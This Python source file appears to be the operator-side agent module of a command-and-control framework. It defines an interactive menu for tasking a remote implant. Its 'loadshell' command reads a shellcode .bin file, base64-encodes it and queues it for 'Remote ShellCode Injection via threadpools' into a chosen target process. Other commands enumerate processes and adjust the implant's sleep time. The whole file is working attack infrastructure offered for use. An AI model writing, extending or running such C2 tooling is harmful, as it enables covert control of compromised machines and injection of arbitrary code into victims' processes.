import os
import base64
import time

from shutil import rmtree

from core.common import *

class Agent:

    def __init__(self, name, listener, remoteip, hostname, Type, username):

        self.name      = name
        self.listener  = listener
        self.remoteip  = remoteip
        self.hostname  = hostname
        self.Type      = Type
        self.username  = username
        self.sleept    = 3
        self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
        self.tasksPath = "{}tasks".format(self.Path, self.name)
        
        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        
        from core.menu import Menu
        
        try:
            self.menu = Menu(self.name)
            self.menu.registerCommand("enumproc", "Enumerate all running processes", "")
            self.menu.registerCommand("loadshell", "Remote ShellCode Injection via threadpools ", "<target process> <location of .bin>")
            self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
            self.menu.registerCommand("clear", "Clear tasks.", "")
            self.menu.registerCommand("quit", "Task agent to quit.", "")

            self.menu.uCommands()

            self.Commands = self.menu.Commands
        except Exception as e:
            print(f"An error occurred while loading menu: {e}")
            pass
    
    def writeTask(self, task):
        with open(self.tasksPath, "w") as f:
            f.write(task)

    def clearTasks(self):

        if os.path.exists(self.tasksPath):
            os.remove(self.tasksPath)
        else:
            pass

    def update(self):
        
        self.menu.name = self.name
        self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
        self.tasksPath = "{}tasks".format(self.Path, self.name)
        
        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        
    def rename(self, newname):
        
        task    = "rename " + newname
        self.writeTask(task)
        
        progress("Waiting for agent.")
        while os.path.exists(self.tasksPath):
            pass
        
        return 0
    
    def enumproc(self):
        task = "enumproc"
        self.writeTask(task)
    
    def loadshell(self, args):
        if len(args) != 2:
            error("Invalid arguments for loadshell. Please provide <target process> <location of .bin>.")
            return
        
        target_process = args[0]
        binfile = args[1]

        # Expand user home directory (~) and make relative paths absolute
        binfile = os.path.abspath(os.path.expanduser(binfile))

        print(f"Target Process: {target_process}")
        print(f"Binary File: {binfile}\n")

        if not os.path.isfile(binfile):
            error("File does not exist.")
            return

        try:
            with open(binfile, "rb") as f:
                data = f.read()
            encoded_data = base64.b64encode(data).decode('utf-8')
            task = f"loadshell {target_process} {encoded_data}"
            self.writeTask(task)
            success("Loadshell task written successfully.")
        except Exception as e:
            error(f"An error occurred while reading the file: {e}")


    def sleep(self, args):

        if len(args) != 1:
            error("Invalid arguments.")
        else:
            time = args[0]

            try:
                temp = int(time)
            except:
                error("Invalid time.")
                return 0
            
            task = "sleep {}".format(time)
            self.writeTask(task)
            self.sleept = int(time)
            removeFromDatabase(agentsDB, self.name)
            writeToDatabase(agentsDB, self)

    def QuitandRemove(self):
        from core.menu import home
        self.Quit()

        rmtree(self.Path)
        removeFromDatabase(agentsDB,self.name)

        home()
        
        return 0

    def Quit(self):
        
        self.writeTask("quit")

        progress("Waiting for agent.")

        for i in range(self.sleept):
            
            if os.path.exists(self.tasksPath):
                time.sleep(1)
            else:
                break

        return 0

    def ev(self, command, args):
        from core.menu import home,Exit
        if command == "help":
            self.menu.showHelp()
        elif command == "home":
            home()
        elif command == "exit":
            Exit()
        elif command == "enumproc":
            self.enumproc()
        elif command == "loadshell":
            self.loadshell(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTasks()
        elif command == "quit":
            self.QuitandRemove()

    def interact(self):
        self.menu.clearScreen()

        while True:
            try:
                command, args = self.menu.parse()
            except Exception as e:
                print(f"Error parsing command: {e}")
                continue

            # Ignore empty input
            if command is None or command == "":
                continue

            if command not in self.Commands:
                error("Invalid command.")
            else:
                # Handle commands as before
                if command == "sleep":
                    if len(args) == 1 and args[0].isdigit():
                        self.ev(command, args)
                    else:
                        error("Invalid argument for sleep. Please provide a numeric value.")
                elif command == "loadshell":
                    if len(args) == 2:
                        self.ev(command, args)
                    else:
                        error("Invalid arguments for loadshell. Please provide <target process> <location of .bin>.")
                else:
                    self.ev(command, args)

